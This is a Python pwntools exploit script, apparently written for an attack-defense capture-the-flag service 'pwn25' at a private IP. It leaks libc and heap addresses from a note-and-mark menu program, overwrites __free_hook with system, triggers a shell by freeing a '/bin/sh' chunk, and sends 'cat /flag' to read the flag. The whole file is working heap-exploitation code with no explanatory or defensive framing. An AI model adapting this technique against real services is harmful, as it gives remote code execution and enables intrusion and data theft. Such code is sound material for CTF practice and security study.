#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="warn"
pwn_file="p25/pwn25"
elf=ELF(pwn_file)
libc=ELF("p25/libc.so.6")
heap_add=0
#stack_add=0
def exploit(ip):
    r=remote(ip,5070)
    try:
        def debug():
            log.debug("process pid:%d"%pid)
            #log.debug("stack add:0x%x"%stack_add)
            log.debug("heap add:0x%x"%heap_add)
            log.debug("libc add:0x%x"%libc.address)
            pause()

        def add_note(size,name,cont):
            data=r.recvuntil("$",timeout=1)
            if data =="":
                assert 1>2
            r.sendline("new")
            data=r.recvuntil("note size:",timeout=1)
            if data=="":
                assert 1>2
            r.sendline(str(size))
            r.sendafter(" name:",name,timeout=1)
            r.sendafter("content:",cont,timeout=1)

        def show_note(idx):
            r.sendlineafter("$","show",timeout=1)
            sleep(0.0001)
            r.sendlineafter(" note index:",str(idx),timeout=1)
            sleep(0.0001)
            r.recvuntil("id:",timeout=1)
            id=int(r.recvline(timeout=1))
            r.recvuntil("size:",timeout=1)
            size=int(r.recvline(timeout=1))
            r.recvuntil("name:",timeout=1)
            name=r.recvline(timeout=1)[:-1]
            r.recvuntil("content:",timeout=1)
            cont=r.recvline(timeout=1)
            return id,size,name,cont

        def dele_note(idx):
            r.sendlineafter("$","delete note",timeout=1)
            sleep(0.0001)
            r.sendlineafter("note index:",str(idx),timeout=1)
            sleep(0.0001)

        def add_mark(idx,info):
            r.sendlineafter("$","mark",timeout=1)
            sleep(0.0001)
            r.sendafter("$ index of note you want to mark:",str(idx),timeout=1)
            r.sendafter("$ mark info:",info,timeout=1)

        def edit_mark(idx,cont):
            r.sendlineafter("$","edit_mark",timeout=1)
            sleep(0.0001)
            data=r.recvuntil("index:",timeout=1)
            if data== "":
                raise 1>2
            r.sendline(str(idx))
            sleep(0.0001)
            r.sendafter("$ mark content:",cont,timeout=1)

        def show_mark(idx):
            r.sendlineafter("$ ","show_mark",timeout=1)
            sleep(0.0001)
            r.sendlineafter("mark index:",str(idx),timeout=1)
            sleep(0.0001)
            return r.recvline(timeout=1)[:-1]

        def dele_mark(idx):
            r.sendlineafter("$","delete_mark",timeout=1)
            sleep(0.0001)
            r.sendlineafter("$ mark index:",str(idx),timeout=1)
            sleep(0.0001)

        def add_char(size,char):
            data=r.recvuntil("choice :",timeout=1)
            if data=="":
                raise 1>2
            r.sendline("1")
            sleep(0.0001)
            r.sendlineafter("Length of the name :",str(size),timeout=1)
            sleep(0.0001)
            r.sendafter("character :",char,timeout=1)
            r.sendlineafter("haracter :","1",timeout=1)
            sleep(0.0001)

        def del_char(idx):
            r.sendlineafter("choice :","3",timeout=1)
            sleep(0.0001)
            data=r.recvuntil("eat:",timeout=1)
            if data=="":
                raise 1>2
            r.sendline(str(idx))
            sleep(0.0001)

        def show_char(idx,cnt):
            r.sendlineafter("choice :","2",timeout=1)
            sleep(0.0001)
            name=[]
            types=[]
            for i in range(cnt):
                r.recvuntil(":",timeout=1)
                name.append(r.recvline(timeout=1)[:-1])
                r.recvuntil(":",timeout=1)
                types.append(r.recvline(timeout=1)[:-1])
            return name,types

        add_char(0x300,"a"*0x300)
        add_char(0x300,"b"*0x300)
        del_char(0)
        add_char(0x8,"a"*8)
        name,_=show_char(2,2)
        libc.address=u64(name[1][8:].ljust(8,"\x00"))-0x3c4b78-0x1c40
        r.sendlineafter("Your choice : ","1337",timeout=1)
        sleep(0.0001)
        add_note(0x100,"a"*0x20,"a"*0x100)
        add_note(0x100,"a"*0x20,"a"*0x100)
        _,_,name,_=show_note(0)
        heap_add=u64(name[0x20:].ljust(8,"\x00"))-0x1060-0x80+0x1010
        add_mark(0,"a"*0x20)
        add_mark(0,"a"*0x20)
        add_mark(0,"/bin/bash\x00".ljust(0x20,"\x00"))
        add_note(0x100,"a"*0x20,"a"*0x100)
        f={
            0x30:"/bin/sh\x00",
            0x38:p64(libc.sym["__free_hook"])
        }
        edit_mark(1,fit(f,filler="a"))
        edit_mark(2,p64(libc.sym["system"])+"\n")
        dele_mark(2)
        r.clean()
        r.sendline("cat /flag")
        flag=r.recvline(timeout=1)[:-1]
        r.close()
    except Exception as e:
        r.close()
        raise e
    return flag

if __name__=="__main__":
    print exploit("172.16.5.33")


